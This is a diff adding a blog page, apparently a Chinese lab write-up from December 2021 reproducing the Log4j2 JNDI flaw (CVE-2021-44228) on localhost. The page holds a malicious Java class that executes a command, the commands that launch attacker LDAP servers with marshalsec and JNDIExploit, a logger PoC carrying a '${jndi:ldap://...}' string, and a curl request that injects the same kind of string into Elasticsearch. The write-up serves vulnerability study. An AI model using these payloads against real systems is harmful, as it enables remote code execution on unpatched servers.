@@ -1,0 +1,306 @@
+<!--
+////////////////////////////////////////////////////////////////////
+//                          _ooOoo_                               //
+//                         o8888888o                              //
+//                         88" . "88                              //
+//                         (| ^_^ |)                              //
+//                         O\  =  /O                              //
+//                      ____/`---'\____                           //
+//                    .'  \\|     |//  `.                         //
+//                   /  \\|||  :  |||//  \                        //
+//                  /  _||||| -:- |||||-  \                       //
+//                  |   | \\\  -  /// |   |                       //
+//                  | \_|  ''\---/''  |   |                       //
+//                  \  .-\__  `-`  ___/-. /                       //
+//                ___`. .'  /--.--\  `. . ___                     //
+//              ."" '<  `.___\_<|>_/___.'  >'"".                  //
+//            | | :  `- \`.;`\ _ /`;.`/ - ` : | |                 //
+//            \  \ `-.   \_ __\ /__ _/   .-` /  /                 //
+//      ========`-.____`-.___\_____/___.-`____.-'========         //
+//                           `=---='                              //
+//      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^        //
+//         ���汣��       ����Bug     �����޸�                    //
+////////////////////////////////////////////////////////////////////
+-->
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>log4j2漏洞复现 - xp111</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="renderer" content="webkit">
+    <meta name="keywords" content="XP,"> 
+    <meta name="description" content="log4j2漏洞复现log4j2介绍
+log4j2是Java开发常用的日志框架，该漏洞触发的条件低，危害大，属于核弹级的漏洞。该漏洞是由阿里云安全团队发现报告的。
+
+该漏洞的CVE编号是：CVE-2,"> 
+    <meta name="author" content="xp"> 
+    <link rel="alternative" href="atom.xml" title="xp111" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<link rel="alternate" type="application/rss+xml" title="RSS" href="https://lmih.cn/rss.php">
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://lmih.cn/wlwmanifest.xml">
+<link rel="stylesheet" type="text/css" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" type="text/css" href="https://lmih.cn/content/templates/colorful/style.css?v=2020">
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://lmih.cn/xmlrpc.php?rsd">
+<link rel="stylesheet" type="text/css" media="all" href="https://player.lmih.cn/api/mainColor?url=myhkplayer&amp;id=155016211198">
+<script type="text/javascript" src="//lib.baomitu.com/jquery/1.9.1/jquery.min.js"></script>
+<script>!window.jQuery && document.write('<script src="https://lmih.cn/content/templates/colorful/js/jquery.min.js"><\/script >');</script>
+<script type="text/javascript" src="https://lmih.cn/content/templates/colorful/js/jquery.fancybox.min.js"></script>
+<script type="text/javascript" src="https://lmih.cn/content/templates/colorful/js/masonry.min.js?v=20170316"></script>
+<link rel="stylesheet" type="text/css" href="https://lmih.cn/content/templates/colorful/jquery.fancybox.min.css">
+<script type="text/javascript" src="//lib.baomitu.com/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
+<script type="text/javascript" src="//lib.baomitu.com/prettify/r298/prettify.min.js"></script>
+<script type="text/javascript" src="https://lmih.cn/include/lib/js/common_tpl.js"></script>
+<script>
+var _czc = _czc || [];
+_czc.push(["_setAccount", "2796448"]);
+</script>
+<style>
+	.letter-avatar[src=""]{visibility: hidden;}
+</style>
+<script>(function(a,b){window.LetterAvatar=function(d,l,j){d=d||"";l=l||60;var h="#1abc9c #2ecc71 #3498db #9b59b6 #34495e #16a085 #27ae60 #2980b9 #8e44ad #2c3e50 #f1c40f #e67e22 #e74c3c #00bcd4 #95a5a6 #f39c12 #d35400 #c0392b #bdc3c7 #7f8c8d".split(" "),f,c,k,g,e,i;f=String(d);f=f.replace(/\uD83C[\uDF00-\uDFFF]|\uD83D[\uDC00-\uDE4F]/g,"");f=f?f.charAt(0):"?";if(a.devicePixelRatio){l=(l*a.devicePixelRatio)}c=(f=="?"?72:f.charCodeAt(0))-64;k=c%h.length;g=b.createElement("canvas");g.width=l;g.height=l;e=g.getContext("2d");e.fillStyle=j?j:h[k-1];e.fillRect(0,0,g.width,g.height);e.font=Math.round(g.width/2)+"px 'Microsoft Yahei'";e.textAlign="center";e.fillStyle="#fff";e.fillText(f,l/2,l/1.5);i=g.toDataURL();g=null;return i}})(window,document);
+</script>
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<script type="text/javascript" src="/js/click-love.js"></script>
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">xp111</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="https://fly-xp.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">log4j2漏洞复现</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">log4j2漏洞复现</h1>
+        <div class="stuff">
+            <span>十二月 17, 2021</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h1 id="log4j2漏洞复现"><a href="#log4j2漏洞复现" class="headerlink" title="log4j2漏洞复现"></a>log4j2漏洞复现</h1><h2 id="log4j2介绍"><a href="#log4j2介绍" class="headerlink" title="log4j2介绍"></a>log4j2介绍</h2><ol>
+<li><p>log4j2是Java开发常用的日志框架，该漏洞触发的条件低，危害大，属于核弹级的漏洞。该漏洞是由阿里云安全团队发现报告的。</p>
+</li>
+<li><p>该漏洞的CVE编号是：CVE-2021-44228</p>
+</li>
+<li><p>属于高危漏洞</p>
+<h2 id="log4j2漏洞环境搭建及复现"><a href="#log4j2漏洞环境搭建及复现" class="headerlink" title="log4j2漏洞环境搭建及复现"></a>log4j2漏洞环境搭建及复现</h2></li>
+<li><p>首先需要搭建LDAP环境</p>
+<p>1.1 第一种通过marshalsec进行搭建</p>
+<ul>
+<li>这种方式搭建比较麻烦（提前踩坑）</li>
+<li>首先通过python开启一个http服务，来模拟vps（当然也可以通过使用其他方式开启服务）<ul>
+<li>注意一定不要使用idea编译，因为idea编译会自动添加package的路径，服务器触发恶意类时，没有该包的路径，执行会报错Exception in thread “main” java.lang.NoClassDefFoundError ，所以使用javac对该恶意类进行编译。（其实这是JNDI-Injection生成的）<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestExec</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TestExec</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String var0 = <span class="string">"calc"</span>;</span><br><span class="line">            Runtime.getRuntime().exec(var0);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var1) &#123;</span><br><span class="line">            var1.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<p>现在通过marshalsec启动一个ldap服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8080/m_project/<span class="comment">#TestExec</span></span><br></pre></td></tr></table></figure>
+
+<p>#后面是恶意类的类名，路径是你启动服务的路径。<br>   1.2 第二种通过JNDI-Injection来进行搭建（比较简单）</p>
+<ul>
+<li><p>这种方式复现比较简单</p>
+</li>
+<li><p>下载JNDI-Injection的jar包可以更加快捷的开启jndi服务</p>
+</li>
+<li><p>开启命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">  java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 127.0.0.1:1389</span><br><span class="line"></span><br><span class="line">- 后面的ip和端口都可以根据需求进行更改</span><br><span class="line">2. poc代码及复现结果</span><br><span class="line"></span><br><span class="line">   创建一个maven工程，配置log4j2小于16版本的pom.xml文件</span><br><span class="line">   </span><br><span class="line">   &#96;&#96;&#96;java</span><br><span class="line">   import org.apache.logging.log4j.Level;</span><br><span class="line">   import org.apache.logging.log4j.LogManager;</span><br><span class="line">   import org.apache.logging.log4j.Logger;</span><br><span class="line">   </span><br><span class="line">   public class Log4jRCE &#123;</span><br><span class="line">       private static Logger logger &#x3D; LogManager.getLogger(Log4jRCE.class);</span><br><span class="line">   </span><br><span class="line">       public static void main(String[] args) &#123;</span><br><span class="line">   　　　　　&#x2F;&#x2F;jdk高版本必须</span><br><span class="line">           System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);</span><br><span class="line">           System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;, &quot;true&quot;);</span><br><span class="line">           &#x2F;&#x2F;logger.info(&quot;$&#123;jndi:ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F;wkcpkh&#125;&quot;);&#x2F;&#x2F;JNDI-Injection方式</span><br><span class="line">           logger.info(&quot;$&#123;jndi:ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F;hello&#125;&quot;);&#x2F;&#x2F;这个hello是瞎填的，填别的也可以，但必须要有</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>可以通过idea直接运行该poc代码，结果是本地计算机会弹出一个计算器。</p>
+<img src="/2021/12/17/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Users\21641\Desktop\1.png" alt="1" style="zoom:80%;">
+
+<ol start="3">
+<li>Elasticsearch log4j2漏洞</li>
+</ol>
+<p>Elasticsearch同样也受到影响，在 Elasticsearch 里面通过构造特定查询，输出带攻击指令的日志，比如执行如下指令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H &#39;Content-Type:appliction&#x2F;json&#39; -XPOST http:&#x2F;&#x2F;127.0.0.1:9200&#x2F;%24%7Bjndi%3A%7D&#x2F;_close -d &#39;&#123;&quot;message&quot;:&quot;&#123;$jndi:ldap:&#125;&quot;&#125;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>通过查看Elasticsearch的日志可以看到我们的攻击日志。</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='2' data-url='https://link.hhtjim.com/qq/0039MnYb0qxYhV.mp3'></li>
+                        
+                    
+                        
+                            <li title='3' data-url='http://musicapi.qianqian.com/dmhaudioproxy/PguXpFQYJVzexhCxV+4jl9OPVXjRAhL9i1bNA+6jvvI='></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='true'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#log4j2漏洞复现"><span class="toc-number">1.</span> <span class="toc-text">log4j2漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#log4j2介绍"><span class="toc-number">1.1.</span> <span class="toc-text">log4j2介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#log4j2漏洞环境搭建及复现"><span class="toc-number">1.2.</span> <span class="toc-text">log4j2漏洞环境搭建及复现</span></a></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({"HTML-CSS": { preferredFont: "TeX", availableFonts: ["STIX","TeX"], linebreaks: { automatic:true }, EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50) },
+        tex2jax: { inlineMath: [ ["$", "$"], ["\\(","\\)"] ], processEscapes: true, ignoreClass: "tex2jax_ignore|dno",skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']},
+        TeX: {  noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } }, Macros: { href: "{}" } },
+        messageStyle: "none"
+    });
+</script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+
+
+<script id="myhk" src="https://player.lmih.cn/player/js/player.js" key="demo" m="1"></script>
+
+
+</html>
